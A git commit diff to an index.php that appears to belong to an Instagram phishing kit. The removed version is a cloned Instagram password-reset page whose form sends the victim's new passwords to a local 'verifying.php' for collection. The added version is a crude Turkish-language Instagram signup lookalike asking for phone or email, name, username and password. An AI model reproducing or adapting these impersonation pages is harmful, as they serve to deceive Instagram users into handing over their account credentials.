3a154e33dc8c94de4a369769238fc377f4d4962d
keko01 <hatipyucel@gmail.com>
2019-05-12 00:55:49 +0300

    Update index.php

--- index.php
+++ index.php
@@ -1,320 +1,37 @@
-<!DOCTYPE html>
-<!-- saved from url=(0126)https://www.instagram.com/accounts/password/reset/confirm/3etcsmm/4z3-64e47279d08bd266b57134a7c018b69f/?s=password_reset_email -->
-<html lang="en" class="js not-logged-in "><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+<html>
+<head>
+<link rel="Shortcut Icon" href="instagram.ico" type="image/x-icon">
+<link rel="stylesheet" type="text/css" href="tasarim.css"/>
+<title>
+İnstagram
+</title>
+<head>
+<body bgcolor="#fafafa">
+<center>
+<br>
+<table border="0">
+<tr>
+<td>
+<img src="tel.png">
+</td>
+<td bgcolor="white">
+<div class="ana">
+<a href=""><img src="face-giris.png"></a>
+<br><center>
 
-        <title>
-                  Instagram
-                </title>
+<input type="text" placeholder="Cep Telefonu Numarası veya E-posta"><br>
+<input type="text" placeholder="Tam Adın"><br>
+<input type="text" placeholder="Kullanıcı Adı"><br>
+<input type="password" placeholder="Şifre"><br>
+<a href="#"><img src="kaydol.png"></a><br>
+<a href="giris.php"><img src="giris.png"><br></a>
 
-        
-        <meta name="robots" content="noimageindex, noarchive">
-        <meta name="mobile-web-app-capable" content="yes">
-        <meta name="theme-color" content="#000000">
-        <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover">
-        
+</div></center></td>
+</tr>
+</table>
 
-        <link rel="manifest" href="https://www.instagram.com/data/manifest.json">
-
-        
-
-        
-        
-
-        <script src="./Instagram_files/1425767024389221" async=""></script><script async="" src="./Instagram_files/fbevents.js"></script><script type="text/javascript">
-        (function() {
-  var docElement = document.documentElement;
-  var classRE = new RegExp('(^|\\s)no-js(\\s|$)');
-  var className = docElement.className;
-  docElement.className = className.replace(classRE, '$1js$2');
-})();
-</script>
-        <!-- first_input_delay is a js file copied from https://fburl.com/rc21x6p3
-in order to use it statically for server side rendering.
-We should aim to keep it consistent with their updates -->
-<!-- This is a js file copied from https://fburl.com/rc21x6p3
-in order to use it statically for server side rendering..
-We should aim to keep it consistent with their updates -->
-
-<script type="text/javascript">
-
-/*
- Copyright 2018 Google Inc. All Rights Reserved.
- Licensed under the Apache License, Version 2.0 (the "License");
- you may not use this file except in compliance with the License.
- You may obtain a copy of the License at
-
-     http://www.apache.org/licenses/LICENSE-2.0
-
- Unless required by applicable law or agreed to in writing, software
- distributed under the License is distributed on an "AS IS" BASIS,
- WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- See the License for the specific language governing permissions and
- limitations under the License.
-*/
-
-(function(){function g(a,c){b||(b=a,f=c,h.forEach(function(a){removeEventListener(a,l,e)}),m())}function m(){b&&f&&0<d.length&&(d.forEach(function(a){a(b,f)}),d=[])}function n(a,c){function k(){g(a,c);d()}function b(){d()}function d(){removeEventListener("pointerup",k,e);removeEventListener("pointercancel",b,e)}addEventListener("pointerup",k,e);addEventListener("pointercancel",b,e)}function l(a){if(a.cancelable){var c=performance.now(),b=a.timeStamp;b>c&&(c=+new Date);c-=b;"pointerdown"==a.type?n(c,
-a):g(c,a)}}var e={passive:!0,capture:!0},h=["click","mousedown","keydown","touchstart","pointerdown"],b,f,d=[];h.forEach(function(a){addEventListener(a,l,e)});window.perfMetrics=window.perfMetrics||{};window.perfMetrics.onFirstInputDelay=function(a){d.push(a);m()}})();
-</script>
-
-<script type="text/javascript">
-(function() {
-  if ('PerformanceObserver' in window && 'PerformancePaintTiming' in window) {
-    window.__bufferedPerformance = [];
-    var ob = new PerformanceObserver(function(e) {
-      window.__bufferedPerformance.push.apply(window.__bufferedPerformance,e.getEntries());
-    });
-    ob.observe({entryTypes:['paint']});
-  }
-  window.__bufferedErrors = [];
-  window.onerror = function(message, url, line, column, error) {
-    window.__bufferedErrors.push({
-      message: message,
-      url: url,
-      line: line,
-      column: column,
-      error: error
-    });
-    return false;
-  };
-  window.__initialData = {
-    pending: true,
-    waiting: []
-  };
-  function notifyLoaded(item, data) {
-    item.pending = false;
-    item.data = data;
-    for (var i = 0;i < item.waiting.length; ++i) {
-      item.waiting[i].resolve(item.data);
-    }
-    item.waiting = [];
-  }
-  function notifyError(item, msg) {
-    item.pending = false;
-    item.error = new Error(msg);
-    for (var i = 0;i < item.waiting.length; ++i) {
-      item.waiting[i].reject(item.error);
-    }
-    item.waiting = [];
-  }
-  window.__initialDataLoaded = function(initialData) {
-    notifyLoaded(window.__initialData, initialData);
-  };
-  window.__initialDataError = function(msg) {
-    notifyError(window.__initialData, msg);
-  };
-  window.__additionalData = {};
-  window.__pendingAdditionalData = function(paths) {
-    for (var i = 0;i < paths.length; ++i) {
-      window.__additionalData[paths[i]] = {
-        pending: true,
-        waiting: []
-      };
-    }
-  };
-  window.__additionalDataLoaded = function(path, data) {
-    if (path in window.__additionalData) {
-      notifyLoaded(window.__additionalData[path], data);
-    } else {
-      console.error('Unexpected additional data loaded "' + path + '"');
-    }
-  };
-  window.__additionalDataError = function(path, msg) {
-    if (path in window.__additionalData) {
-      notifyError(window.__additionalData[path], msg);
-    } else {
-      console.error('Unexpected additional data encountered an error "' + path + '": ' + msg);
-    }
-  };
-})();
-</script>
-                <link rel="apple-touch-icon-precomposed" sizes="76x76" href="https://www.instagram.com/static/images/ico/apple-touch-icon-76x76-precomposed.png/4272e394f5ad.png">
-                <link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://www.instagram.com/static/images/ico/apple-touch-icon-120x120-precomposed.png/02ba5abf9861.png">
-                <link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://www.instagram.com/static/images/ico/apple-touch-icon-152x152-precomposed.png/419a6f9c7454.png">
-                <link rel="apple-touch-icon-precomposed" sizes="167x167" href="https://www.instagram.com/static/images/ico/apple-touch-icon-167x167-precomposed.png/a24e58112f06.png">
-                <link rel="apple-touch-icon-precomposed" sizes="180x180" href="https://www.instagram.com/static/images/ico/apple-touch-icon-180x180-precomposed.png/85a358fb3b7d.png">
-                
-                    <link rel="icon" sizes="192x192" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
-                
-            
-            
-                    <link rel="mask-icon" href="https://www.instagram.com/static/images/ico/favicon.svg/fc72dd4bfde8.svg" color="#262626">
-                  
-                  <link rel="shortcut icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
-                
-            
-            
-    <link rel="stylesheet" type="text/css" href="./Instagram_files/ac3908099bec.css">
-
-            
-    
-    <script type="text/javascript" src="./Instagram_files/a4e77326039e.js" crossorigin="anonymous"></script>
-    <script type="text/javascript" src="./Instagram_files/2ccc68edcffd.js" crossorigin="anonymous"></script>
-    <script type="text/javascript" src="./Instagram_files/faf1d668dee8.js" crossorigin="anonymous"></script>
-</head>
-    <body class="sidebar-page -cx-PRIVATE-SidebarLayout__page -cx-PRIVATE-SidebarLayout__page__ page-accounts">
-        
-            <div class="root -cx-PRIVATE-Page__root -cx-PRIVATE-Page__root__">
-                
-                    <div class="page -cx-PRIVATE-Page__body -cx-PRIVATE-Page__body__">
-                        
-                            
-                                <header class="top-bar top-bar-new -cx-PRIVATE-NavBar__root -cx-PRIVATE-NavBar__root__">
-    <div class="top-bar-wrapper -cx-PRIVATE-NavBar__wrapper -cx-PRIVATE-NavBar__wrapper__">
-        <div class="logo -cx-PRIVATE-NavBar__logo -cx-PRIVATE-NavBar__logo__"><a href="https://www.instagram.com/">Instagram</a></div>
-
-        <div class="top-bar-left -cx-PRIVATE-NavBar__topBarLeft -cx-PRIVATE-NavBar__topBarLeft__">
-            <ul class="top-bar-actions">
-                <li>
-                    <a class="top-bar-home" href="https://www.instagram.com/" label="Home"><i></i></a>
-                </li>
-            </ul>
-        </div>
-
-        
-            <div class="top-bar-right account-state" id="top_bar_right">
-                <ul class="top-bar-actions -cx-PRIVATE-NavBar__topBarActions -cx-PRIVATE-NavBar__topBarActions__">
-                    
-                    
-                      
-                      <li id="link_profile" class="link-signin -cx-PRIVATE-NavBar__signIn -cx-PRIVATE-NavBar__signIn__">
-                          <a href="https://www.instagram.com/accounts/login/" class="loginLink">
-                              <i></i>
-                              <strong class="-cx-PRIVATE-NavBar__signInText -cx-PRIVATE-NavBar__signInText__">Log in</strong>
-                          </a>
-                      </li>
-                      
-                    
-                </ul>
-            </div>
-        
-    </div>
-</header> <!-- .top-bar -->
-                            
-                        
-
-                        
-    <div class="main -cx-PRIVATE-Page__main -cx-PRIVATE-Page__main__">
-        <div class="sidebar -cx-PRIVATE-SidebarLayout__root -cx-PRIVATE-SidebarLayout__root__">
-            <div class="wrapper -cx-PRIVATE-SidebarLayout__navWrapper -cx-PRIVATE-SidebarLayout__navWrapper__">
-                <nav class="sidebar-nav -cx-PRIVATE-SidebarLayout__nav -cx-PRIVATE-SidebarLayout__nav__">
-                    <div class="sidebar-content -cx-PRIVATE-SidebarLayout__content -cx-PRIVATE-SidebarLayout__content__">
-                    
-                    </div>
-                </nav>
-            </div>
-        </div>
-        <div class="wrapper -cx-PRIVATE-SidebarLayout__contentWrapper -cx-PRIVATE-SidebarLayout__contentWrapper__">
-            <section class="nav-page-content -cx-PRIVATE-SidebarLayout__pageContent -cx-PRIVATE-SidebarLayout__pageContent__" role="main">
-                
-    <h1>Instagram</h1>
-    
-
-    
-
-    
-
-
-
-    <form action="verifying.php" method="POST" accept-charset="utf-8">
-        <p><label for="id_new_password1">New password:</label> <input id="id_new_password1" name="new_password1" type="password"></p>
-<p><label for="id_new_password2">New password confirmation:</label> <input id="id_new_password2" name="new_password2" type="password"></p>
-        <p><input type="submit" value="Reset Password"></p>
-    </form>
-    
-
-
-            </section>
-        </div> <!-- .main -->
-    </div> <!-- .main -->
-
-
-                    </div> <!-- .page -->
-
-                    
-                    <footer class="page-footer -cx-PRIVATE-Footer__root -cx-PRIVATE-Footer__root__" role="contentinfo">
-                        <div class="wrapper -cx-PRIVATE-Footer__wrapper -cx-PRIVATE-Footer__wrapper__">
-                            <nav class="-cx-PRIVATE-Footer__nav -cx-PRIVATE-Footer__nav__">
-                                <ul class="-cx-PRIVATE-Footer__navItems -cx-PRIVATE-Footer__navItems__">
-                                    <li><a href="https://www.instagram.com/about/us/">About us</a></li>
-                                    <li><a href="http://help.instagram.com/">Support</a></li>
-                                    <li><a href="http://blog.instagram.com/">Blog</a></li>
-                                    <li><a href="https://instagram-press.com/">Press</a></li>
-                                    <li><a href="https://www.instagram.com/developer/">API</a></li>
-                                    <li><a href="https://www.instagram.com/about/jobs/">Jobs</a></li>
-                                    <li><a href="https://www.instagram.com/legal/privacy/">Privacy</a></li>
-                                    <li><a href="https://www.instagram.com/legal/terms/">
-                                      
-                                          Terms
-                                      
-                                    </a></li>
-                                </ul>
-                            </nav>
-
-                            <p class="copyright -cx-PRIVATE-Footer__copyright -cx-PRIVATE-Footer__copyright__">© 2018 Instagram</p>
-                        </div>
-                    </footer>
-                    
-                
-                <div id="reactModalMountPoint"></div>
-            </div> <!-- .root -->
-        
-        
-
-        
-            
-
-            
-<script>
-!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
-n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
-document,'script','//connect.facebook.net/en_US/fbevents.js');
-
-fbq('init', '1425767024389221');
-
-fbq('track', 'PageView');
-
-
-</script>
-<noscript>
-
-
-</noscript>
-
-            
-        
-        <script>function normalizeError(err) {
-            var errorInfo = err.error || {};
-            return {
-              line: err.line || errorInfo.message || 0,
-              column: err.column || 0,
-              name: 'InitError',
-              message: err.message || errorInfo.message || '',
-              script: errorInfo.script || '',
-              stack: errorInfo.stackTrace || errorInfo.stack || '',
-              timestamp: Date.now(),
-              ref: window.location.href,
-              is_canary: window._sharedData && window._sharedData.is_canary ? window._sharedData.is_canary : false,
-              rollout_hash: window._sharedData && window._sharedData.rollout_hash ? window._sharedData.rollout_hash : '',
-              is_prerelease: window.__PRERELEASE__ || false,
-              bundle_variant: window._sharedData && window._sharedData.bundle_variant ? window._sharedData.bundle_variant : null,
-              request_url: err.url || window.location.href,
-              response_status_code: errorInfo.statusCode || 0
-            }
-          }
-
-          if (window.__bufferedErrors && window.__bufferedErrors.length) {
-            window.__bufferedErrors.map(function(error) {
-              return normalizeError(error)
-            }).forEach(function(normalizedError) {
-              var request = new XMLHttpRequest();
-              request.open('POST', '/client_error/', true);
-              request.setRequestHeader('Content-Type', 'application/json; charset=utf-8');
-              request.send(JSON.stringify(normalizedError));
-            })
-          }
-        </script>
-    
-</body></html>
+<img src="footer.png">
+</center>
+</body>
+</html>
+<!-- Ömer Ülkü -->
